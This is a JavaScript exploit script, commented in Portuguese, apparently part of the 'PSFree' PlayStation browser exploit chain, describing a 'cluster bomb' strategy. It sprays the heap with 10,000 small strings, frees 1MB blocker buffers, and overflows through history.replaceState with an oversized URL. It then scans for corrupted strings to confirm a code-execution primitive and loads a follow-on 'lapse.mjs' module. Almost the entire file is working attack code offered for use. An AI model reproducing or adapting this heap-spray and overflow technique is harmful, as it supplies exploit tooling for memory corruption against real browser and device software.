/* PSFree Modular: Cluster Bomb Strategy
   Trigger: 1MB Overflow
   Victim: Swarm of Small Strings (96 bytes) - PSFree Standard
*/

import { log, sleep } from './module/utils.mjs';

// --- CONFIGURAÇÃO ---
const OVERFLOW_AMT = 1024 * 128; // Exagero proposital para atropelar tudo
const BASE_OFFSET = 709520;

// Configuração da Vítima (Pequena - Estilo PSFree)
const VICTIM_SIZE = 96; // Tamanho pequeno padrão do PSFree
const SWARM_SIZE = 10000; // Quantidade massiva

var victims = [];
var blockers = [];

async function main() {
    log("=== PSFree: Cluster Bomb Strategy ===");
    log("Tática: Criar um buraco de 1MB cercado por milhares de vítimas pequenas.");

    // Tenta 5 vezes, recriando o Heap a cada vez
    for (let attempt = 1; attempt <= 5; attempt++) {
        log(`\n--- Tentativa ${attempt} ---`);
        
        await prepare_cluster();
        
        // Dispara o exploit
        let success = await trigger_cluster();
        
        if (success) {
            log("!!! RCE PRIMITIVE CONFIRMED !!!", 'green');
            // Carrega o Lapse
            await import('./lapse.mjs');
            return;
        }
        
        // Limpa tudo
        victims = [];
        blockers = [];
        await forceGC();
    }
    
    log("Falha. O isolamento do Heap 12.00 é muito forte.", 'red');
}

// Cria a String no formato PSFree (Header + Dados)
function create_victim_string(index) {
    const u32 = new Uint32Array(1);
    u32[0] = index;
    const u8 = new Uint8Array(u32.buffer);
    
    // Padding para chegar no tamanho desejado
    // 96 bytes total - overhead
    const pad = "B".repeat(VICTIM_SIZE - 4); 
    
    // Retorna string flat
    return [pad, String.fromCodePoint(...u8)].join('');
}

async function prepare_cluster() {
    log("1. Posicionando Bloqueadores (1MB)...");
    blockers = [];
    // Criamos alguns blocos grandes para reservar o espaço do exploit
    for(let i=0; i<10; i++) {
        let b = new Uint8Array(1024 * 1024); // 1MB
        b.fill(0x41);
        blockers.push(b);
    }

    log(`2. Lançando Enxame (${SWARM_SIZE} vítimas)...`);
    victims = [];
    // Spray massivo de objetos pequenos
    for(let i=0; i<SWARM_SIZE; i++) {
        victims.push(create_victim_string(i));
    }

    await forceGC();
    
    log("3. Abrindo o Buraco (Target Zone)...");
    // Liberamos os blocos de 1MB. Agora temos buracos gigantes cercados por vítimas pequenas.
    blockers = []; 
    await forceGC();
}

async function trigger_cluster() {
    try {
        log("4. Disparando Overflow no Buraco...");

        // O Payload é o mesmo: Enche o buraco e transborda
        let buffer = "A".repeat(BASE_OFFSET);
        
        // Não usamos ponte de zeros aqui. Queremos destruir tudo.
        // O alvo são objetos pequenos, o header está a poucos bytes da borda.
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        history.replaceState({}, "cluster", "/" + buffer);

        return check_swarm();

    } catch(e) {
        log("Erro no Trigger: " + e.message);
        return false;
    }
}

function check_swarm() {
    log("5. Verificando sobreviventes...");
    for(let i=0; i<victims.length; i++) {
        let s = victims[i];
        if(!s) continue;

        try {
            // O truque do Error
            let err = new Error(s);
            let msg = err.message;

            // Se o tamanho mudou (RCE)
            // Como as strings são pequenas (96 bytes), qualquer mudança drástica é visível
            if (msg.length !== VICTIM_SIZE && msg.length > 0) {
                log(`!!! JACKPOT !!! Vítima ${i} (Pequena) Length: ${msg.length}`, 'green');
                alert("RCE UNLOCKED (CLUSTER)!");
                return true;
            }

            // Se o conteúdo mudou
            if (msg.charCodeAt(0) !== 66) { // 'B'
                // Em objetos pequenos, acertar dados geralmente significa ter passado pelo header
                // ou destruído o objeto.
                log(`[Sinal] Vítima ${i} corrompida.`, 'yellow');
            }

        } catch(e) {}
    }
    return false;
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 400));
}

main();
